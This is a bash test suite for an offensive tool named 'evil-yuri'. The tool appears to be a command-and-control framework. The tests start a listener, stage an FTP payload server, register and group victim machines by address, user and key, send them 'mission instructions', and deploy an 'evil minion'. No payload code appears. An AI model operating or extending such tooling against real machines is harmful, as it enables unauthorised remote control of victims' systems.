#!/bin/bash
#
# Regards, the Alveare Solutions society,
#
# TEST SUIT

function run_test_suit () {
    local EXIT_CODE=0
    test_start_minion_listener
    local EXIT_CODE=$((EXIT_CODE + $?))
    test_setup_ftp_payload_server
    local EXIT_CODE=$((EXIT_CODE + $?))
    test_create_conscript_group
    local EXIT_CODE=$((EXIT_CODE + $?))
    test_conscript_registration
    local EXIT_CODE=$((EXIT_CODE + $?))
    test_group_conscripts
    local EXIT_CODE=$((EXIT_CODE + $?))
    test_interogate_conscripts
    local EXIT_CODE=$((EXIT_CODE + $?))
    test_mission_instruction
    local EXIT_CODE=$((EXIT_CODE + $?))
    test_conscript_commander
    local EXIT_CODE=$((EXIT_CODE + $?))
    test_search_conscript_groups
    local EXIT_CODE=$((EXIT_CODE + $?))
    test_search_conscript_records
    local EXIT_CODE=$((EXIT_CODE + $?))
    test_remove_conscripts_from_group
    local EXIT_CODE=$((EXIT_CODE + $?))
    test_delete_conscript_group
    local EXIT_CODE=$((EXIT_CODE + $?))
    test_archive_conscript_records
    local EXIT_CODE=$((EXIT_CODE + $?))
    test_search_conscript_archives
    local EXIT_CODE=$((EXIT_CODE + $?))
    test_delete_conscript_archive
    local EXIT_CODE=$((EXIT_CODE + $?))
    test_deploy_minion
    local EXIT_CODE=$((EXIT_CODE + $?))
    cleanup
    local EXIT_CODE=$((EXIT_CODE + $?))
    symbol_msg "${BLUE}TEST-SUIT${RESET}" "${SCRIPT_NAME} (v.${EY_VERSION})"
    display_test_case_status $EXIT_CODE
    return $EXIT_CODE
}

function test_search_conscript_archives () {
    symbol_msg "${BLUE}TEST${RESET}" "Search Conscript Archives"
    ${MD_CARGO['evil-yuri']}  \
        --action='search-archives' \
        --criteria='all' \
        --deprecated-archive="${MD_DEFAULT['deprecated-archive']}" \
        --victim-identifier="${MD_DEFAULT['victim-identifiers']}"
    display_test_case_status $?
    return $?
}

function test_conscript_commander () {
    symbol_msg "${BLUE}TEST${RESET}" "Conscript Commander"
    ${MD_CARGO['evil-yuri']}  \
        --action='conscript-commander' \
        --victim-identifier="${MD_DEFAULT['victim-identifiers']}" \
        --protocol="${MD_DEFAULT['protocol']}"
    display_test_case_status $?
    return $?
}

function test_interogate_conscripts () {
    symbol_msg "${BLUE}TEST${RESET}" "Interogate Conscripts"
    ${MD_CARGO['evil-yuri']}  \
        --action='interogate-conscripts' \
        --project-root="${MD_DEFAULT['project-path']}" \
        --protocol="${MD_DEFAULT['protocol']}" \
        --target="${MD_DEFAULT['target']}" \
        --victim-address="${MD_DEFAULT['victim-addresses']}" \
        --port-number="${MD_DEFAULT['port-number']}" \
        --victim-user="${MD_DEFAULT['victim-user']}" \
        --victim-key="${MD_DEFAULT['victim-key']}" \
        --victim-identifier="${MD_DEFAULT['victim-identifiers']}" \
        --papertrail-reports
    display_test_case_status $?
    return $?
}

function test_mission_instruction () {
    symbol_msg "${BLUE}TEST${RESET}" "Mission Instruction"
    local INSTRUCTION=`echo ${MD_DEFAULT['mission-instruction']} | sed 's/\s/\[space\]/g'`
    ${MD_CARGO['evil-yuri']}  \
        --action='mission-instruction' \
        --project-root="${MD_DEFAULT['project-path']}" \
        --target="${MD_DEFAULT['target']}" \
        --victim-address="${MD_DEFAULT['victim-addresses']}" \
        --port-number="${MD_DEFAULT['port-number']}" \
        --victim-user="${MD_DEFAULT['victim-user']}" \
        --victim-key="${MD_DEFAULT['victim-key']}" \
        --mission-instruction="$INSTRUCTION" \
        --papertrail-reports
    display_test_case_status $?
    return $?
}

function test_create_conscript_group () {
    symbol_msg "${BLUE}TEST${RESET}" "Create Conscript Group"
    ${MD_CARGO['evil-yuri']}  \
        --action='create-group' \
        --project-root="${MD_DEFAULT['project-path']}" \
        --group="${MD_DEFAULT['group-labels']}"
    display_test_case_status $?
    return $?
}

function test_conscript_registration () {
    symbol_msg "${BLUE}TEST${RESET}" "Conscript Registration"
    ${MD_CARGO['evil-yuri']}  \
        --action='register-conscript' \
        --project-root="${MD_DEFAULT['project-path']}" \
        --protocol="${MD_DEFAULT['protocol']}" \
        --victim-address="${MD_DEFAULT['victim-addresses']}" \
        --port-number="${MD_DEFAULT['port-number']}" \
        --victim-user="${MD_DEFAULT['victim-user']}" \
        --victim-key="${MD_DEFAULT['victim-key']}" \
        --victim-identifier="${MD_DEFAULT['victim-identifiers']}" \
        --group="${MD_DEFAULT['group-labels']}" \
        --papertrail-reports
    display_test_case_status $?
    return $?
}

function test_group_conscripts () {
    symbol_msg "${BLUE}TEST${RESET}" "Group Conscripts"
    ${MD_CARGO['evil-yuri']}  \
        --action='group-conscripts' \
        --project-root="${MD_DEFAULT['project-path']}" \
        --target="${MD_DEFAULT['target']}" \
        --criteria="${MD_DEFAULT['search-criteria']}" \
        --group="${MD_DEFAULT['group-labels']}" \
        --victim-key="${MD_DEFAULT['victim-key']}"
    display_test_case_status $?
    return $?
}

function test_search_conscript_groups () {
    symbol_msg "${BLUE}TEST${RESET}" "Search Conscript Groups"
    ${MD_CARGO['evil-yuri']}  \
        --action='search-groups' \
        --criteria="${MD_DEFAULT['search-criteria']}" \
        --group="${MD_DEFAULT['group-labels']}"
    display_test_case_status $?
    return $?
}

function test_delete_conscript_group () {
    symbol_msg "${BLUE}TEST${RESET}" "Delete Conscript Groups"
    ${MD_CARGO['evil-yuri']}  \
        --action='delete-group' \
        --group="${MD_DEFAULT['group-labels']}"
    display_test_case_status $?
    return $?
}

function test_search_conscript_records () {
    symbol_msg "${BLUE}TEST${RESET}" "Search Conscript Records"
    ${MD_CARGO['evil-yuri']}  \
        --action='search-conscripts' \
        --criteria="${MD_DEFAULT['search-criteria']}" \
        --victim-identifier="${MD_DEFAULT['victim-identifiers']}" \
        --victim-address="${MD_DEFAULT['victim-addresses']}" \
        --port-number="${MD_DEFAULT['port-number']}" \
        --victim-key="${MD_DEFAULT['victim-key']}" \
        --victim-user="${MD_DEFAULT['victim-user']}"
    display_test_case_status $?
    return $?
}

function test_remove_conscripts_from_group () {
    symbol_msg "${BLUE}TEST${RESET}" "Remove Conscripts From Group"
    ${MD_CARGO['evil-yuri']}  \
        --action='rebase-conscripts' \
        --victim-identifier="${MD_DEFAULT['victim-identifiers']}"
    display_test_case_status $?
    return $?
}

function test_archive_conscript_records () {
    symbol_msg "${BLUE}TEST${RESET}" "Archive Conscript Records"
    ${MD_CARGO['evil-yuri']}  \
        --action='archive-conscripts' \
        --project-root="${MD_DEFAULT['project-path']}" \
        --target="${MD_DEFAULT['target']}" \
        --deprecated-archive="${MD_DEFAULT['deprecated-archive']}" \
        --victim-identifier="${MD_DEFAULT['victim-identifiers']}"
    display_test_case_status $?
    return $?
}

function test_delete_conscript_archive () {
    symbol_msg "${BLUE}TEST${RESET}" "Delete Conscript Archive"
    ${MD_CARGO['evil-yuri']}  \
        --action='delete-archive' \
        --deprecated-archive="${MD_DEFAULT['deprecated-archive']}"
    display_test_case_status $?
    return $?
}

function test_start_minion_listener () {
    symbol_msg "${BLUE}TEST${RESET}" "Start Minion Listener"
    ${MD_CARGO['evil-yuri']}  \
        --action='start-minion-listener' \
        --project-root="${MD_DEFAULT['project-path']}" \
        --protocol="${MD_DEFAULT['protocol']}" \
        --port-number="${MD_DEFAULT['port-number']}" \
        --foreground
    display_test_case_status $?
    return $?
}

function test_setup_ftp_payload_server () {
    symbol_msg "${BLUE}TEST${RESET}" "Setup FTP Payload Server"
    ${MD_CARGO['evil-yuri']}  \
        --action='setup-ftp' \
        --ftp-conf="${MD_DEFAULT['ftp-conf-template']}"
    display_test_case_status $?
    return $?
}

function test_deploy_minion () {
    symbol_msg "${BLUE}TEST${RESET}" "Deploy Evil Minion"
    ${MD_CARGO['evil-yuri']}  \
        --action='deploy-minion' \
        --project-root="${MD_DEFAULT['project-path']}" \
        --target="${MD_DEFAULT['target']}" \
        --protocol="${MD_DEFAULT['protocol']}" \
        --victim-address="${MD_DEFAULT['victim-addresses']}" \
        --port-number="${MD_DEFAULT['port-number']}" \
        --victim-user="${MD_DEFAULT['victim-user']}" \
        --victim-key="${MD_DEFAULT['victim-key']}" \
        --ftp-url="${MD_DEFAULT['ftp-serv-address']}" \
        --minion-path="${MD_DEFAULT['minion-path']}"
    display_test_case_status $?
    return $?
}

function display_test_case_status () {
    local EXIT_CODE=$1
    local MSG="EXIT CODE ($EXIT_CODE) - `date +%D-%T`"
    if [ $EXIT_CODE -ne 0 ]; then
        nok_msg "$MSG"
    else
        ok_msg "$MSG"
    fi
    return $EXIT_CODE
}

function cleanup () {
    rm -rf "$CURRENT_DIRECTORY/data/victim-machines"
    return $?
}

if [ "$1" == "--cleanup" ] || [ "$1" = "-c" ]; then
    cleanup
    exit $?
fi

